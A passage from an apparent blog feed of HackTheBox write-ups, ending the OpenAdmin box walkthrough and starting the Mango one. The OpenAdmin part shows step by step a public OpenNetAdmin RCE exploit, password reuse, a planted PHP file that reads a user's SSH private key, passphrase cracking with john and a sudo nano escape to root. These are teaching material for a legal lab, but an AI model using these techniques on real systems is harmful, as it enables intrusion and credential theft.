page"></p><p>Nothing really interesting to see here… Let’s open  <code>gobuster</code> to see if he can find some juicy files and folders:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"http://openadmin.htb/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/artwork (Status: 301)</span><br><span class="line">/music (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/sierra (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/01/23 11:25:48 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>Three uncommon folder here: </p><ul><li><p><code>artwork</code> and <code>sierra</code> are just static demo website, nothing to do on it. </p></li><li><p><code>music</code> looks like this:</p></li></ul><p><img src="https://user-images.githubusercontent.com/9076747/73017609-6efa6280-3e20-11ea-9f62-3d00bd0d24a9.png" alt="music website hackthebox"></p><p>Oddly enough the <code>Login</code> button redirect to an admin interface:</p><p><img src="https://user-images.githubusercontent.com/9076747/73017790-ac5ef000-3e20-11ea-9efa-0c4587673e66.png" alt="open admin page"></p><p>First thing that catch the eye is this big yellow message:</p><blockquote><p>You are NOT on the latest release version<br>Your version    = v18.1.1<br>Latest version = Unable to determine    </p><p>Please DOWNLOAD the latest version.</p></blockquote><p>We all know what outdated software means right :D </p><p>Selecting the “DOWNLOAD” link redirect to the software page which is called…. <code>OpenNetAdmin</code>. At first I though the name of the box would be related to a admin page being open and easily accessible but turn out it was more a reference to the software used.</p><p>We have the name of the software and it’s version (which is outdated). Let’s see if some already made exploits are available:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit opennetadmin</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                               |  Path</span><br><span class="line">                                                             | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits/php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits/php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits/php/webapps/47691.sh</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure><p>Bingo! Remote code execution on the exact version running here. Should be easy right?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://www.exploit-db.com/raw/47691 -o opennetadmin-rce.sh</span><br><span class="line">[hg8@archbook ~]$ bash exploit.sh http://openadmin.htb/ona/</span><br><span class="line">&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>We got a shell as <code>www-data</code>.</p><h3 id="Pivot-www-data-gt-jimmy"><a href="#Pivot-www-data-gt-jimmy" class="headerlink" title="Pivot www-data -&gt; jimmy"></a>Pivot www-data -&gt; jimmy</h3><p>Let’s start by enumerating users:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@openadmin:/$ ls -lh /home/</span><br><span class="line">total 8.0K</span><br><span class="line">drwxr-x--- 5 jimmy  jimmy  4.0K Jan 24 02:10 jimmy</span><br><span class="line">drwxr-x--- 6 joanna joanna 4.0K Nov 28 09:37 joanna</span><br></pre></td></tr></table></figure><p>Two users, we don’t have enough rights to access neither of their home folder. Let’s continue our enumerations.</p><p>One thing that often gives good results on web applications is searching for hard-coded password. A little grep can do that for us:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@openadmin:/$ grep -ri pass .</span><br><span class="line">[...]</span><br><span class="line">./<span class="built_in">local</span>/config/database_settings.inc.php: <span class="string">'db_passwd'</span> =&gt; <span class="string">'n1nj4W4rri0R!'</span>,</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Here is something interesting! The full config file is the following:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ona_contexts=<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'DEFAULT'</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'databases'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt;</span><br><span class="line">      <span class="keyword">array</span> (</span><br><span class="line">        <span class="string">'db_type'</span> =&gt; <span class="string">'mysqli'</span>,</span><br><span class="line">        <span class="string">'db_host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">        <span class="string">'db_login'</span> =&gt; <span class="string">'ona_sys'</span>,</span><br><span class="line">        <span class="string">'db_passwd'</span> =&gt; <span class="string">'n1nj4W4rri0R!'</span>,</span><br><span class="line">        <span class="string">'db_database'</span> =&gt; <span class="string">'ona_default'</span>,</span><br><span class="line">        <span class="string">'db_debug'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'description'</span> =&gt; <span class="string">'Default data context'</span>,</span><br><span class="line">    <span class="string">'context_color'</span> =&gt; <span class="string">'#D3DBFF'</span>,</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>Let’s see if this password can work for either <code>jimmy</code> or <code>joanna</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh joanna@openadmin.htb</span><br><span class="line">joanna@openadmin.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">joanna@openadmin.htb'</span>s password:</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ ssh jimmy@openadmin.htb</span><br><span class="line">jimmy@openadmin.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Jan 24 01:52:49 2020 from 10.10.14.43</span></span><br><span class="line"><span class="string">jimmy@openadmin:~$ ls</span></span><br><span class="line"><span class="string">jimmy@openadmin:~$</span></span><br></pre></td></tr></table></figure><p>It works with <code>jimmy</code>! Unfortunately there is no user flags here, but at least we get a stable shell. </p><h3 id="Pivot-jimmy-gt-joanna"><a href="#Pivot-jimmy-gt-joanna" class="headerlink" title="Pivot jimmy -&gt; joanna"></a>Pivot jimmy -&gt; joanna</h3><p>Since we got database access I went to check if we could find juicy informations and potential other users password hash in the database:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:~$ mysql -u ona_sys -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| ona_default        |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; USE ona_default;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_ona_default  |</span><br><span class="line">+------------------------+</span><br><span class="line">| [...]                  |</span><br><span class="line">| users                  |</span><br><span class="line">| [...]                  |</span><br><span class="line">+------------------------+</span><br><span class="line">40 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">| id | username | password                         | level | ctime               | atime               |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-01-23 10:12:57 | 2020-01-23 10:12:57 |</span><br><span class="line">|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>Two MD5 hash. Quick Google search shows that <code>098f6bcd4621d373cade4e832627b4f6</code> is hash for <code>test</code> and <code>21232f297a57a5a743894a0e4a801fc3</code> is hash for <code>admin</code>.</p><p>Too bad no hash for <code>joanna</code> here. Let’s move on to more recon.</p><p>While looking around (still using the awesome <code>grep</code>) we find some interesting config files mentioning <code>joanna</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/etc$ grep -ri <span class="string">"joanna"</span> . 2&gt;/dev/null</span><br><span class="line">./passwd-:joanna:x:1001:1001::/home/joanna:/bin/bash</span><br><span class="line">./apache2/sites-available/internal.conf:AssignUserID joanna joanna</span><br><span class="line">./sudoers.d/joanna:joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>The <code>sudoers.d</code> one look perfect for a privilege escalation don’t you think ? Let’s keep this in mind for later. The one that really catch my eye is the apache config. Let’s see the full file:</p><figure class="highlight apacheconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">Listen</span></span> 127.0.0.1:52846</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 127.0.0.1:52846&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> internal.openadmin.htb</span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/internal</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;IfModule mpm_itk_module&gt;</span></span><br><span class="line"><span class="attribute">AssignUserID</span> joanna joanna</span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>It was the first time I saw about the <code>AssignUserID</code> configuration. Even if we can easily understand that it’s meant to run the apache process for this virtualhost as <code>joanna</code> instead of <code>www-data</code> I searched on the documentation out of curiosity to learn more about this.</p><p>This configuration is available through the <a href="http://mpm-itk.sesse.net/" target="_blank" rel="noopener"><code>apache2-mpm-itk</code></a> module: </p><blockquote><p><code>AssignUserID</code>: Takes two parameters, uid and gid (or<br> really, user name and group name; use “#<uid>” if you want to<br> specify a raw uid); specifies what uid and gid the<br> vhost will run as (after parsing the request etc., of course).</p></blockquote><p>So, the virtualhost for <code>/var/www/internal</code> document root runs as <code>joanna</code>. If we can find a Remote Code Execution command in the PHP code in this folder (by abusing an <code>eval</code> or uploading web shell for example), then we can run commands as <code>joanna</code> user. </p><p>To be honest, I missed this folder in my previous recons, so let’s see what’s inside now:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/$ ls -l /<span class="keyword">var</span>/www/</span><br><span class="line">drwxr-xr-x <span class="number">6</span> www-data www-data <span class="number">4096</span> Nov <span class="number">22</span> <span class="number">15</span>:<span class="number">59</span> html</span><br><span class="line">drwxrwx--- <span class="number">2</span> jimmy    internal <span class="number">4096</span> Jan <span class="number">24</span> <span class="number">03</span>:<span class="number">11</span> internal</span><br><span class="line">jimmy@openadmin:/<span class="keyword">var</span>/www/internal$ ls -l</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal <span class="number">3228</span> Jan <span class="number">24</span> <span class="number">03</span>:<span class="number">11</span> index.php</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal  <span class="number">185</span> Nov <span class="number">23</span> <span class="number">16</span>:<span class="number">37</span> logout.php</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal  <span class="number">339</span> Nov <span class="number">23</span> <span class="number">17</span>:<span class="number">40</span> main.php</span><br></pre></td></tr></table></figure><p>Here is something interesting… The <code>internal</code> folder is owned by our current <code>jimmy</code>, meaning we can write anything we want in this folder. I will use use the <code>shell_exec()</code> php function to try to retrieve <code>joanna</code> ssh private key.</p><p>Here is one way to do it:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$output = shell_exec(<span class="string">'cat /home/joanna/.ssh/id_rsa'</span>);</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure><p>Now let’s run it! (Remember apache listen on port <code>52846</code> for this virutalhost as we can see in the <code>internal.conf</code> config file)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/$ curl 127.0.0.1:52846/hg8.php</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">[...]</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>Bingo! </p><p><em>Note: Don’t forget to remove your php file to not spoil users after you ;)</em></p><p>We can now use <code>joanna</code> ssh private key to login to her account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i joanna_id_rsa joanna@openadmin.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'joanna_id_rsa'</span>:</span><br></pre></td></tr></table></figure><p>No luck! Passphrase is needed. From here we have two choices:</p><ol><li><p>Either we go back to our php script and edit it to open a reverse shell instead of grabbing the private key.</p></li><li><p>We try to brute-force <code>joanna</code> private key passphrase. </p></li></ol><p>I think it would be more interesting to show how to brute-force the hash, if we fail we can still go back to open a simple reserve shell. </p><p>I will use <code>john</code> to bruteforce the ssh key passphrase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john joanna_id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">bloodninjas      (joanna_id_rsa)</span><br><span class="line">1g 0:00:00:14 DONE (2020-01-24 17:05) 0.07062g/s 1012Kp/s 1012Kc/s 1012KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">[hg8@archbook ~]$ john --show id_rsa.hash</span><br><span class="line">joanna_id_rsa:bloodninjas</span><br></pre></td></tr></table></figure><p>Great we got it, and it’s related to ninja again. Let’s grab our flag now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i joanna_id_rsa joanna@openadmin.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'joanna_id_rsa'</span>:</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3</span><br><span class="line">joanna@openadmin:~$ cat user.txt</span><br><span class="line">cxxxxxxxxxxxxxxxxxxxxxxxxxxf</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The recon phase won’t be needed there since we already got the information we needed while searching around for user flag. As a reminder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">joanna@openadmin:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br></pre></td></tr></table></figure><p>A good habit for fast privilege escalation techniques is to check on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>.    </p><p>As a reminder:</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>And of course there is an entry for <code>nano</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/73084568-7b88c480-3ecd-11ea-8092-c4d2e7eb43ed.png" alt="GTFObins nano"></p><p><em>Note: ^R means CTRL+R, same for ^X means CTRL+X</em></p><h3 id="Exploit-nano-SUID"><a href="#Exploit-nano-SUID" class="headerlink" title="Exploit nano SUID"></a>Exploit nano SUID</h3><p>Let’s give it a try!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">joanna@openadmin:~$ sudo /bin/nano /opt/priv</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)         </span><br><span class="line"><span class="comment"># cat /root/root.txt                           </span></span><br><span class="line">2xxxxxxxxxxxxxxxxxxxxxxxx1</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedbacks :)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> exploit </tag>
            
            <tag> sudo </tag>
            
            <tag> gtfobins </tag>
            
            <tag> php </tag>
            
            <tag> john </tag>
            
            <tag> openadmin </tag>
            
            <tag> opennetadmin </tag>
            
            <tag> shell_exec </tag>
            
            <tag> apache </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Mango</title>
      <link href="/posts/mango/"/>
      <url>/posts/mango/</url>
      
        <content type="html"><![CDATA[<img width="572" alt="mango-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158122-27dc2580-9886-11ea-89a6-cf00163a1207.png"><p>Mango just retired on HackTheBox, it was an Medium rated Linux box. As usual I really liked the whole exploration process especially the custom exploitation part and learned a bit about Mongodb. I know I say this every-time but this box is my favorite box so far.</p><p><strong>Tl;Dr:</strong> User flag was accessible after exploiting an NoSQL injection flaw to extract usernames and passwords of accounts present on the box. Those credentials can be used to SSH login to the box as <code>mango</code> then pivoting to the <code>admin</code> user holding the flag by <code>su</code> to it using the password extracted previously.<br>The root flag was accessible by exploiting the <code>jjs</code> binary that have setuid bit set allowing to read and write files on the box as <code>root</code> user.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.162 mango.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC mango.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> mango.htb (10.10.10.162)</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443/tcp open  ssl/ssl Apache httpd (SSL-only mode)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">|_ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 33.34 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web apps running on port 80 and 443 and the SSH port 22 open. </p><p><code>nmap</code> scan display an interesting information about the SSL certificate on port 443:<br><code>staging-order.mango.htb</code>. Let’s add this <code>staging-order</code> to our <code>hosts</code> file since it can come useful in the future.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.162 staging-order.mango.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Opening <code>http://mango.htb</code> display a forbidden page while <code>https://mango.htb</code> display a search engine:</p><p><img src="https://user-images.githubusercontent.com/9076747/68053118-74498480-fceb-11e9-90d0-6509fb84711d.png" alt="mango search engine"></p><p><em>Note: Because Chrome wouldn’t display this page because of wrong certificate I completely skipped it before noticing it was accessible with Firefox. Because of that I accidentally avoided a big rabbit-hole. Win-Win.</em></p><p>Let’s fire <code>gobuster</code> to check if we can find interesting directories and/or pages there:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://mango.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>Nothing here it seems… Let’s try port 443. We use option <code>-k</code> to skip SSL certificate verification:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u https://mango.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/analytics.php (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2019/11/01 21:27:59 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>Not a lot of results but <code>analytics.php</code> sounds interesting. After a bit of research it turned out to be a rabbit 